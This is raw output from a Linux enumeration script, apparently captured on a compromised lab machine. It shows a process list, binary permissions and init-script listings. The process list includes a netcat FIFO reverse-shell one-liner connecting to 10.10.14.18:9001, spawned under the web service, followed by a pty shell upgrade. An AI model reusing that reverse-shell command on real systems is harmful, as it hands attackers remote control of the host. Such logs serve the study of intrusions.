root        17  0.0  0.0      0     0 ?        S<   Nov12   0:00 [writeback]
root        18  0.0  0.0      0     0 ?        S    Nov12   0:00 [kcompactd0]
root        19  0.0  0.0      0     0 ?        SN   Nov12   0:00 [ksmd]
root        20  0.0  0.0      0     0 ?        SN   Nov12   0:00 [khugepaged]
root        21  0.0  0.0      0     0 ?        S<   Nov12   0:00 [crypto]
root        22  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kintegrityd]
root        23  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kblockd]
root        24  0.0  0.0      0     0 ?        S<   Nov12   0:00 [ata_sff]
root        25  0.0  0.0      0     0 ?        S<   Nov12   0:00 [md]
root        26  0.0  0.0      0     0 ?        S<   Nov12   0:00 [edac-poller]
root        27  0.0  0.0      0     0 ?        S<   Nov12   0:00 [devfreq_wq]
root        28  0.0  0.0      0     0 ?        S<   Nov12   0:00 [watchdogd]
root        32  0.0  0.0      0     0 ?        S    Nov12   0:00 [kauditd]
root        33  0.0  0.0      0     0 ?        S    Nov12   0:00 [kswapd0]
root        34  0.0  0.0      0     0 ?        S    Nov12   0:00 [ecryptfs-kthrea]
root        76  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kthrotld]
root        77  0.0  0.0      0     0 ?        S<   Nov12   0:00 [acpi_thermal_pm]
root        79  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_0]
root        80  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_0]
root        81  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_1]
root        82  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_1]
root        85  0.0  0.0      0     0 ?        S<   Nov12   0:00 [ipv6_addrconf]
root       111  0.0  0.0      0     0 ?        S<   Nov12   0:00 [charger_manager]
root       166  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_2]
root       167  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_2]
root       168  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_3]
root       169  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_3]
root       170  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_4]
root       171  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_4]
root       172  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_5]
root       173  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_5]
root       174  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_6]
root       175  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_6]
root       176  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_7]
root       177  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_7]
root       178  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_8]
root       179  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_8]
root       180  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_9]
root       181  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_9]
root       182  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_10]
root       183  0.0  0.0      0     0 ?        S<   Nov12   0:00 [ttm_swap]
root       184  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_10]
root       185  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_11]
root       186  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_11]
root       187  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_12]
root       188  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_12]
root       189  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_13]
root       190  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_13]
root       191  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_14]
root       192  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_14]
root       193  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_15]
root       194  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_15]
root       195  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_16]
root       196  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_16]
root       197  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_17]
root       198  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_17]
root       199  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_18]
root       200  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_18]
root       201  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_19]
root       202  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_19]
root       203  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_20]
root       204  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_20]
root       205  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_21]
root       206  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_21]
root       207  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_22]
root       208  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_22]
root       209  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_23]
root       210  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_23]
root       211  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_24]
root       212  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_24]
root       213  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_25]
root       214  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_25]
root       215  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_26]
root       216  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_26]
root       217  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_27]
root       218  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_27]
root       219  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_28]
root       220  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_28]
root       221  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_29]
root       222  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_29]
root       223  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_30]
root       224  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_30]
root       225  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_31]
root       226  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_31]
root       254  0.0  0.0      0     0 ?        S<   Nov12   0:01 [kworker/0:1H]
root       278  0.0  0.0      0     0 ?        S    Nov12   0:02 [jbd2/sda1-8]
root       279  0.0  0.0      0     0 ?        S<   Nov12   0:00 [ext4-rsv-conver]
root       312  0.0  0.2   5848  2956 ?        Ss   Nov12   0:00 /lib/systemd/systemd-journald
root       330  0.0  0.3  14860  4056 ?        Ss   Nov12   0:00 /lib/systemd/systemd-udevd
root       360  0.0  0.0  20276   176 ?        Ssl  Nov12   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root       370  0.0  0.0      0     0 ?        S<   Nov12   0:00 [nfit]
root       542  0.0  0.0      0     0 ?        S    Nov12   0:00 [jbd2/sda4-8]
root       543  0.0  0.0      0     0 ?        S<   Nov12   0:00 [ext4-rsv-conver]
root       544  0.0  0.0      0     0 ?        S    Nov12   0:00 [jbd2/sda2-8]
root       545  0.0  0.0      0     0 ?        S<   Nov12   0:00 [ext4-rsv-conver]
root       551  0.0  0.8  52360  8904 ?        Ssl  Nov12   1:44 /usr/bin/vmtoolsd
systemd+   571  0.0  0.2  12616  2544 ?        Ssl  Nov12   0:13 /lib/systemd/systemd-timesyncd
root       749  0.0  0.5  37780  5996 ?        Ssl  Nov12   0:02 /usr/lib/accountsservice/accounts-daemon
root       757  0.0  0.2   5584  2716 ?        Ss   Nov12   0:00 /usr/sbin/cron -f
avahi      758  0.0  0.3   5920  3144 ?        Ss   Nov12   0:04 avahi-daemon: running [gitter.local]
syslog     760  0.0  0.3  30880  3184 ?        Ssl  Nov12   0:00 /usr/sbin/rsyslogd -n
message+   761  0.0  0.4   6496  4424 ?        Ss   Nov12   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
avahi      766  0.0  0.0   5920   280 ?        S    Nov12   0:00 avahi-daemon: chroot helper
root       788  0.0  0.7  39248  7556 ?        Ss   Nov12   0:00 /usr/bin/VGAuthService
root       790  0.0  0.3   4204  3068 ?        Ss   Nov12   0:00 /lib/systemd/systemd-logind
root       793  0.0  1.1 854512 11492 ?        Ssl  Nov12   0:03 /usr/lib/snapd/snapd
root       795  0.0  0.7  41312  7852 ?        Ssl  Nov12   0:00 /usr/sbin/ModemManager
root       839  0.0  0.1   2248  1116 ?        Ss   Nov12   0:00 /usr/sbin/acpid
root       840  0.0  1.3  82008 13728 ?        Ssl  Nov12   0:00 /usr/sbin/NetworkManager --no-daemon
root       946  0.0  0.7  37076  7384 ?        Ssl  Nov12   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       955  0.0  0.5  43404  5528 ?        Ssl  Nov12   0:00 /usr/sbin/lightdm
root       967  0.0  3.3 119708 33736 tty7     Ssl+ Nov12   0:02 /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
root       990  0.0  0.5  27908  6032 ?        Sl   Nov12   0:00 lightdm --session-child 16 19
lightdm    993  0.0  0.4   6388  4156 ?        Ss   Nov12   0:00 /lib/systemd/systemd --user
lightdm    994  0.0  0.1   7512  1256 ?        S    Nov12   0:00 (sd-pam)
lightdm   1001  0.0  0.0   2372   588 ?        Ss   Nov12   0:00 /bin/sh /usr/lib/lightdm/lightdm-greeter-session /usr/sbin/unity-greeter
lightdm   1006  0.0  0.3   6068  3116 ?        Ss   Nov12   0:00 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session
lightdm   1007  0.0  4.9 339480 50856 ?        Sl   Nov12   0:05 /usr/sbin/unity-greeter
lightdm   1009  0.0  0.5  43476  5540 ?        Sl   Nov12   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher --launch-immediately
lightdm   1014  0.0  0.3   5936  3400 ?        S    Nov12   0:00 /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
lightdm   1016  0.0  0.4  29172  4784 ?        Sl   Nov12   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
lightdm   1022  0.0  0.5  38264  5772 ?        Sl   Nov12   0:00 /usr/lib/gvfs/gvfsd
lightdm   1027  0.0  0.4  50688  5036 ?        Sl   Nov12   0:00 /usr/lib/gvfs/gvfsd-fuse /run/user/108/gvfs -f -o big_writes
lightdm   1037  0.0  0.4  25268  4372 ?        Sl   Nov12   0:00 /usr/lib/dconf/dconf-service
root      1042  0.0  0.4   9372  4592 ?        S    Nov12   0:00 lightdm --session-child 12 19
lightdm   1045  0.0  0.3   8148  3872 ?        S    Nov12   0:00 upstart --user --startup-event indicator-services-start
lightdm   1063  0.0  2.9 118272 30152 ?        Sl   Nov12   0:00 nm-applet
lightdm   1070  0.0  0.6  46664  6768 ?        Ssl  Nov12   0:00 /usr/lib/i386-linux-gnu/indicator-messages/indicator-messages-service
lightdm   1071  0.0  0.4  52292  4836 ?        Ssl  Nov12   0:00 /usr/lib/i386-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
lightdm   1072  0.0  0.7  71184  7232 ?        Ssl  Nov12   0:00 /usr/lib/i386-linux-gnu/indicator-power/indicator-power-service
lightdm   1073  0.0  1.1  98748 11420 ?        Ssl  Nov12   0:02 /usr/lib/i386-linux-gnu/indicator-datetime/indicator-datetime-service
lightdm   1074  0.0  2.5 103864 26272 ?        Ssl  Nov12   0:00 /usr/lib/i386-linux-gnu/indicator-keyboard/indicator-keyboard-service --use-gtk
lightdm   1075  0.0  0.9 322132  9512 ?        Ssl  Nov12   0:00 /usr/lib/i386-linux-gnu/indicator-sound/indicator-sound-service
lightdm   1080  0.0  0.5  69416  5904 ?        Ssl  Nov12   0:00 /usr/lib/i386-linux-gnu/indicator-session/indicator-session-service
lightdm   1103  0.0  1.1  57992 11700 ?        Ssl  Nov12   0:00 /usr/lib/i386-linux-gnu/indicator-application/indicator-application-service
lightdm   1122  0.0  0.6 154908  6652 ?        S<l  Nov12   0:00 /usr/bin/pulseaudio --start --log-target=syslog
rtkit     1123  0.0  0.2  23788  2996 ?        SNsl Nov12   0:01 /usr/lib/rtkit/rtkit-daemon
lightdm   1130  0.0  2.1  81292 22344 ?        Sl   Nov12   0:01 /usr/lib/unity-settings-daemon/unity-settings-daemon
root      1142  0.0  0.7  79688  8104 ?        Ssl  Nov12   0:00 /usr/lib/upower/upowerd
colord    1159  0.0  0.9  41728  9916 ?        Ssl  Nov12   0:00 /usr/lib/colord/colord
root      1240  0.0  0.5  10000  5612 ?        Ss   Nov12   0:00 /usr/sbin/sshd -D
whoopsie  1241  0.0  0.7  38172  8068 ?        Ssl  Nov12   0:00 /usr/bin/whoopsie -f
root      1255  0.0  0.1   4752  1856 tty1     Ss+  Nov12   0:00 /sbin/agetty --noclear tty1 linux
roosa     1258  0.0  0.4   6388  4280 ?        Ss   Nov12   0:00 /lib/systemd/systemd --user
roosa     1262  0.0  0.1   7532  1256 ?        S    Nov12   0:00 (sd-pam)
roosa     1272  0.0  0.0   2372   536 ?        S    Nov12   0:00 /bin/sh /home/roosa/deploy/run-gunicorn.sh
roosa     1274  0.0  1.2  17956 13256 ?        S    Nov12   0:23 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
roosa     1279  0.0  1.5  22308 15672 ?        S    Nov12   0:40 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
roosa     1280  0.0  1.5  22304 15840 ?        S    Nov12   0:40 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
roosa     1282  0.0  1.5  22072 15540 ?        S    Nov12   0:40 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
roosa     1283  0.0  1.5  22488 16092 ?        S    Nov12   0:40 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
roosa     1285  0.0  1.5  22068 15652 ?        S    Nov12   0:40 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
roosa     1287  0.0  1.5  22660 16224 ?        S    Nov12   0:40 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
roosa     1288  0.0  1.5  22168 15684 ?        S    Nov12   0:40 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
roosa     1289  0.0  1.5  22176 15672 ?        S    Nov12   0:40 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
root      2085  0.0  0.0      0     0 ?        S    07:29   0:01 [kworker/0:1]
root      2229  0.0  0.6  14196  6948 ?        Ss   07:35   0:00 /usr/sbin/cupsd -l
root      2232  0.0  0.8  37564  8864 ?        Ssl  07:35   0:00 /usr/sbin/cups-browsed
root      2372  0.0  0.0      0     0 ?        S    14:25   0:00 [kworker/0:0]
root      2373  0.0  0.0      0     0 ?        S    14:33   0:00 [kworker/u2:0]
roosa     2402  0.9  1.5  22176 15596 ?        S    18:24   0:11 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
root      2404  0.0  0.0      0     0 ?        S    18:29   0:00 [kworker/u2:1]
roosa     2405  0.0  0.0   2372   540 ?        S    18:32   0:00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 9001 >/tmp/f
roosa     2408  0.0  0.0   4436   604 ?        S    18:32   0:00 cat /tmp/f
roosa     2409  0.0  0.0   2372   604 ?        S    18:32   0:00 /bin/sh -i
roosa     2410  0.0  0.1   2768  1556 ?        S    18:32   0:00 nc 10.10.14.18 9001
roosa     2411  0.5  1.5  22176 15596 ?        S    18:32   0:03 /usr/bin/python /usr/local/bin/gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
roosa     2413  0.0  0.5  10248  5716 ?        S    18:33   0:00 python -c import pty; pty.spawn("/bin/bash")
roosa     2414  0.0  0.4   7008  4544 pts/8    Ss   18:33   0:00 /bin/bash
roosa     2444  0.0  0.3   6264  3600 pts/8    S+   18:43   0:00 bash LinEnum.sh
roosa     2445  0.0  0.3   6356  3268 pts/8    S+   18:43   0:00 bash LinEnum.sh
roosa     2446  0.0  0.0   4288   572 pts/8    S+   18:43   0:00 tee -a
root      2538  0.0  0.0      0     0 ?        S    18:43   0:00 [kworker/u2:2]
roosa     2657  0.0  0.1   6324  1040 pts/8    S+   18:44   0:00 bash LinEnum.sh
roosa     2658  0.0  0.3   7760  3160 pts/8    R+   18:44   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  1109564 May 16  2017 /bin/bash
lrwxrwxrwx 1 root root        4 Aug  4  2017 /bin/sh -> dash
-rwxr-xr-x 1 root root  1534668 Feb  1  2018 /lib/systemd/systemd
-rwxr-xr-x 1 root root   349960 Feb  1  2018 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   641532 Feb  1  2018 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   149252 Feb  1  2018 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   452404 Feb  1  2018 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    38828 Nov 30  2017 /sbin/agetty
lrwxrwxrwx 1 root root       20 Feb  1  2018 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   259940 Jan 12  2017 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    83392 Feb 15  2018 /usr/bin/pulseaudio
lrwxrwxrwx 1 root root        9 Nov 23  2017 /usr/bin/python -> python2.7
-rwxr-xr-x 1 root root   137792 May  8  2018 /usr/bin/VGAuthService
-rwxr-xr-x 1 root root    47316 May  8  2018 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root    59760 Jul 27  2017 /usr/bin/whoopsie
-rwxr-xr-x 1 root root   170936 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root    90712 Feb 24  2016 /usr/lib/at-spi2-core/at-spi2-registryd
-rwxr-xr-x 1 root root    17768 Feb 24  2016 /usr/lib/at-spi2-core/at-spi-bus-launcher
-rwxr-xr-x 1 root root   312808 Nov  6  2015 /usr/lib/colord/colord
-rwxr-xr-x 1 root root    80280 May 27  2015 /usr/lib/dconf/dconf-service
-rwxr-xr-x 1 root root    26580 Aug 17  2017 /usr/lib/gvfs/gvfsd
-rwxr-xr-x 1 root root    34992 Aug 17  2017 /usr/lib/gvfs/gvfsd-fuse
-rwxr-xr-x 1 root root    43020 Jan 20  2017 /usr/lib/i386-linux-gnu/indicator-application/indicator-application-service
-rwxr-xr-x 1 root root    96504 May 26  2016 /usr/lib/i386-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
-rwxr-xr-x 1 root root  1129664 Apr  6  2016 /usr/lib/i386-linux-gnu/indicator-datetime/indicator-datetime-service
-rwxr-xr-x 1 root root   150244 Nov 25  2015 /usr/lib/i386-linux-gnu/indicator-keyboard/indicator-keyboard-service
-rwxr-xr-x 1 root root   113212 May  5  2015 /usr/lib/i386-linux-gnu/indicator-messages/indicator-messages-service
-rwxr-xr-x 1 root root   174716 Jan  5  2016 /usr/lib/i386-linux-gnu/indicator-power/indicator-power-service
-rwxr-xr-x 1 root root   375316 Apr 12  2016 /usr/lib/i386-linux-gnu/indicator-session/indicator-session-service
-rwxr-xr-x 1 root root   342884 Apr  6  2016 /usr/lib/i386-linux-gnu/indicator-sound/indicator-sound-service
-rwxr-xr-x 1 root root     9992 Jan 17  2016 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root    63560 Oct 26  2015 /usr/lib/rtkit/rtkit-daemon
-rwxr-xr-x 1 root root 11512628 Nov 30  2017 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root    38988 Jul  1  2016 /usr/lib/unity-settings-daemon/unity-settings-daemon
-rwxr-xr-x 1 root root   251292 Jun 15  2016 /usr/lib/upower/upowerd
-rwxr-xr-x 1 root root  2557280 Nov 24  2017 /usr/lib/xorg/Xorg
-rwxr-xr-x 1 root root    51068 Apr  8  2016 /usr/sbin/acpid
-rwxr-xr-x 1 root root    43128 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 root root   154332 Aug 22  2016 /usr/sbin/cups-browsed
-rwxr-xr-x 1 root root   505708 Feb 19  2018 /usr/sbin/cupsd
-rwxr-xr-x 1 root root   293680 Mar 31  2017 /usr/sbin/lightdm
-rwxr-xr-x 1 root root  1195592 Nov  4  2015 /usr/sbin/ModemManager
-rwxr-xr-x 1 root root  3483816 Nov 16  2017 /usr/sbin/NetworkManager
-rwxr-xr-x 1 root root   670548 Apr  5  2016 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   957224 Jan 18  2018 /usr/sbin/sshd
-rwxr-xr-x 1 root root   438220 Mar 23  2016 /usr/sbin/unity-greeter


[-] /etc/init.d/ binary permissions:
total 336
drwxr-xr-x   2 root root  4096 May 29 10:44 .
drwxr-xr-x 133 root root 12288 May 29 10:44 ..
-rwxr-xr-x   1 root root  2243 Feb  9  2016 acpid
-rwxr-xr-x   1 root root  5336 Apr 14  2016 alsa-utils
-rwxr-xr-x   1 root root  2014 Dec 28  2014 anacron
-rwxr-xr-x   1 root root  6223 Mar  3  2017 apparmor
-rwxr-xr-x   1 root root  2802 Jan  2  2018 apport
-rwxr-xr-x   1 root root  2401 Nov  4  2015 avahi-daemon
-rwxr-xr-x   1 root root  1987 Mar 26  2018 blogfeed
-rwxr-xr-x   1 root root  2968 Mar  1  2016 bluetooth
-rwxr-xr-x   1 root root  1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x   1 root root  2125 Apr 27  2016 brltty
-rwxr-xr-x   1 root root  3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x   1 root root  1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x   1 root root  9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x   1 root root  1343 Apr  4  2016 console-setup
-rwxr-xr-x   1 root root  3049 Apr  5  2016 cron
-rwxr-xr-x   1 root root  2816 Feb 13  2016 cups
-rwxr-xr-x   1 root root  1961 Feb 13  2016 cups-browsed
-rwxr-xr-x   1 root root  2813 Dec  1  2015 dbus
-rw-r--r--   1 root root  1075 May 29 10:44 .depend.boot
-rw-r--r--   1 root root  1532 May 29 10:44 .depend.start
-rw-r--r--   1 root root  1219 May 29 10:44 .depend.stop
-rwxr-xr-x   1 root root  1172 Oct 23  2015 dns-clean
-rwxr-xr-x   1 root root  1105 Mar 15  2016 grub-common
-rwxr-xr-x   1 root root  1336 Jan 19  2016 halt
-rwxr-xr-x   1 root root  1423 Jan 19  2016 hostname.sh
-rwxr-xr-x   1 root root  3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x   1 root root  2372 Apr 11  2016 irqbalance
-rwxr-xr-x   1 root root  3102 Mar 10  2016 kerneloops
-rwxr-xr-x   1 root root  1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x   1 root root  1300 Jan 19  2016 killprocs
-rwxr-xr-x   1 root root  2087 Dec 20  2015 kmod
-rwxr-xr-x   1 root root  3431 Mar 31  2017 lightdm
-rwxr-xr-x   1 root root   703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x   1 root root  2301 Jan 19  2016 mountall.sh
-rwxr-xr-x   1 root root  1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x   1 root root  1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x   1 root root   711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x   1 root root  2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x   1 root root  4771 Jul 19  2015 networking
-rwxr-xr-x   1 root root  1757 Jan 11  2017 network-manager
-rwxr-xr-x   1 root root  1581 Oct 15  2015 ondemand
-rwxr-xr-x   1 root root  1846 Mar 22  2018 open-vm-tools
-rwxr-xr-x   1 root root  1366 Nov 15  2015 plymouth
-rwxr-xr-x   1 root root   752 Nov 15  2015 plymouth-log
-rwxr-xr-x   1 root root   612 Jan 27  2016 pppd-dns
-rwxr-xr-x   1 root root  1192 Sep  6  2015 procps
-rwxr-xr-x   1 root root  6366 Jan 19  2016 rc
-rwxr-xr-x   1 root root   820 Jan 19  2016 rc.local
-rwxr-xr-x   1 root root   117 Jan 19  2016 rcS
-rw-r--r--   1 root root  2427 Jan 19  2016 README
-rwxr-xr-x   1 root root   661 Jan 19  2016 reboot
-rwxr-xr-x   1 root root  4149 Nov 23  2015 resolvconf
-rwxr-xr-x   1 root root  4355 Jul 10  2014 rsync
-rwxr-xr-x   1 root root  2796 Feb  3  2016 rsyslog
-rwxr-xr-x   1 root root  2522 Jul 10  2015 saned
-rwxr-xr-x   1 root root  3927 Jan 19  2016 sendsigs
-rwxr-xr-x   1 root root   597 Jan 19  2016 single
-rw-r--r--   1 root root  1087 Jan 19  2016 skeleton
-rwxr-xr-x   1 root root  2117 Feb 18  2016 speech-dispatcher
-rwxr-xr-x   1 root root  4077 Mar 16  2017 ssh
-rwxr-xr-x   1 root root  1154 Jan 29  2016 thermald
-rwxr-xr-x   1 root root  6087 Apr 12  2016 udev
-rwxr-xr-x   1 root root  2049 Aug  7  2014 ufw
-rwxr-xr-x   1 root root  2737 Jan 19  2016 umountfs
-rwxr-xr-x   1 root root  2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x   1 root root  1879 Jan 19  2016 umountroot
-rwxr-xr-x   1 root root  1391 Apr 20  2017 unattended-upgrades
-rwxr-xr-x   1 root root  3111 Jan 19  2016 urandom
-rwxr-xr-x   1 root root  1306 Jun 14  2017 uuidd
-rwxr-xr-x   1 root root   485 Jun 15  2016 whoopsie
-rwxr-xr-x   1 root root  2757 Nov 10  2015 x11-common


[-] /etc/init/ config file permissions:
total 368
drwxr-xr-x   2 root root  4096 Mar 19  2018 .
drwxr-xr-x 133 root root 12288 May 29 10:44 ..
-rw-r--r--   1 root root   338 Apr  8  2016 acpid.conf
-rw-r--r--   1 root root   309 Apr 14  2016 alsa-utils.conf
-rw-r--r--   1 root root   278 Dec 28  2014 anacron.conf
-rw-r--r--   1 root root  3709 Mar  3  2017 apparmor.conf
-rw-r--r--   1 root root  1629 Jan  2  2018 apport.conf
-rw-r--r--   1 root root   207 Nov 24  2015 avahi-cups-reload.conf
-rw-r--r--   1 root root   541 Nov 24  2015 avahi-daemon.conf
-rw-r--r--   1 root root   997 Mar  1  2016 bluetooth.conf
-rw-r--r--   1 root root   328 Nov 18  2014 bootmisc.sh.conf
-rw-r--r--   1 root root   232 Nov 18  2014 checkfs.sh.conf
-rw-r--r--   1 root root   253 Nov 18  2014 checkroot-bootclean.sh.conf
-rw-r--r--   1 root root   307 Nov 18  2014 checkroot.sh.conf
-rw-r--r--   1 root root   266 May 19  2016 console.conf
-rw-r--r--   1 root root   250 Apr  4  2016 console-font.conf
-rw-r--r--   1 root root   509 Apr  4  2016 console-setup.conf
-rw-r--r--   1 root root  1122 May 19  2016 container-detect.conf
-rw-r--r--   1 root root   356 May 19  2016 control-alt-delete.conf
-rw-r--r--   1 root root   297 Apr  5  2016 cron.conf
-rw-r--r--   1 root root   525 Aug 22  2016 cups-browsed.conf
-rw-r--r--   1 root root  1815 Mar 25  2016 cups.conf
-rw-r--r--   1 root root   482 Sep  1  2015 dbus.conf
-rw-r--r--   1 root root  1377 May 19  2016 failsafe.conf
-rw-r--r--   1 root root   374 Aug 20  2016 failsafe-x.conf
-rw-r--r--   1 root root   267 May 19  2016 flush-early-job-log.conf
-rw-r--r--   1 root root  1247 Jun  1  2015 friendly-recovery.conf
-rw-r--r--   1 root root   186 Aug 25  2016 gpu-manager.conf
-rw-r--r--   1 root root   284 Jul 23  2013 hostname.conf
-rw-r--r--   1 root root   300 May 21  2014 hostname.sh.conf
-rw-r--r--   1 root root   674 Mar 14  2016 hwclock.conf
-rw-r--r--   1 root root   561 Mar 14  2016 hwclock-save.conf
-rw-r--r--   1 root root   109 Mar 14  2016 hwclock.sh.conf
-rw-r--r--   1 root root   597 Apr 11  2016 irqbalance.conf
-rw-r--r--   1 root root   689 Aug 20  2015 kmod.conf
-rw-r--r--   1 root root  1444 Mar 31  2017 lightdm.conf
-rw-r--r--   1 root root   268 Nov 18  2014 mountall-bootclean.sh.conf
